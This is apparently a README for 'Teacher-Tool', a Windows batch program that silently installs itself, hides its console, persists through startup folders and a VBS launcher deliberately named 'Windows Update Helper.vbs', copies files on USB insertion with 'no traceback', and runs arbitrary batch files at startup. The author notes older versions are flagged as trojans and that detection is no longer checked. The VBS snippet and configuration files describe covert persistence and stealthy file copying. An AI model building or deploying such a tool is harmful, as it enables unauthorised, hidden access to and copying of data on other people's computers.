### OLDER RELEASES ARE DETECTED AS TROJANS, BUT ANYTHING FROM 4.7 ONWARD IS FIXED

# Teacher-Tool

Batch program created to enable quick copying with "0" traceback   

HIGHLY ENCOURAGED TO USE NEWER VERSIONS, OLDER MAY HAVE SEVERE BUGS  

"for fun" downgrading to v1.2 is a bad idea, aside from the bugs, and the limited option, the install location means having suprisingly enough 1 working version (the new one, although would probably crash) and 1 broken vbs, which would then, after replug of usb lead to 2 identical versions running at the same time with 2 vbs, which cant be uninstalled, because of locations and file names; BAD IDEA  
# How to install and use

to install, you need lmao.bat; others will be generated automatically
Installation takes around 1.5 seconds, however most of this time, the cmd is invisible  

after install you only need lmao69.dat with "initcopy" inside (without quotes)  

# File Options

novbs.dat -> enables "Debug" mode meaning that you can see the cmd window (OPTIONAL)  

dontcopy.dat -> disables copying (OPTIONAL)  

UNIN000.dat -> uninstalls the "tool" (OPTIONAL)  

atinsert.dat -> adds programs to be executed at usb insertion (only .bat); works only if name in lmao69.dat (OPTIONAL) 

atstartup.dat -> adds programs to be executed at startup (only .bat); works only if name in lmao69.dat (OPTIONAL)  
code for handling these:
`if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" %%a in (*.bat) do (call "%%a"))`  

transfer.dat -> copy files to hdd upon usb insert; D:\transfer\Desktop\idk.docx => C:\Windows\Users\USERNAME\Desktop\idk.docx (OPTIONAL)  

lmao69.dat -> file responsible for detecting the usb. needs "initcopy" or .bat filename inside (gets executed) to work (ESSENTIAL)  
If you want to rename lmao69.dat, the 38th line in lmao.bat needs to be changed to `set filename=YOUR_FILENAME`  NOTE: In order for this to work, the file on HDD needs the same change; most straight-forward solution would be to reinstall, but if you dont have the time, use rename.bat and atstartup.dat  

force_dat.dat -> if the program doesn't check the file for some reason (i.e. the check for initcopy is disabled(alwaysinitcopy)), this forces the check (OPTIONAL)  

debugmsg.dat -> enables return to normal behavior, in case you dont want the pretty variant (OPTIONAL)  

# 2 additional modules

I have also added 2 additional .bat files that help with certain stuff. First one is uninstallexts.dat, which is used to delete all extra apps installed by atstartup or atinsert and alwaysinit.bat which skips the lmao69.dat check (to check for .bat or initcopy)  

# NOTE

in order to change filename and not reinstall(i.e. dont have the time), use rename.bat(in optional) with atstartup(CHANGE LINE IN FILE); for the first time, you still the old one  
I recommend to do this and then pull out the usb and put it back in  

because of the update bug before 3.7 uppdated (3.2 - 3.5 i think), i recommend using TERMINATE.bat in optional, which terminates the app, then puts initcopy inside lmao69.dat and then starts the usb version...  

if you wish to use older versions/debug versions before 4.1, either download vbs from old releases or put this in "Windows Update Helper.vbs":  
```
Set WshShell = CreateObject("WScript.Shell")
'idk
WshShell.Run chr(34) & "C:\Users\styso\AppData\Roaming\Microsoft\Windows\lmao.bat" & Chr(34), 0
'idk
'idk
Set WshShell = Nothing 
'idk
'idk
```

## Current version: 5.4 (5.3 with attribute edits for usb)
### Current Debug Version: 5.2-DEBUGrelease (also 5.3 - 5.2 with moved comments and ownership)
-------------------
#### I am not responsible for any problems that may arise while using this tool.  
#### Only for educational purposes
-------------------
if testing out previous versions (aside of above mentioned issue and the one at the beginning), read "readmes" in their releases, this one obviously doesnt apply to them  

Actual development was stopped in may. Beware, i am no longer checking if it is detected...  
I may resume at a later date but right now, there will not be any updates...
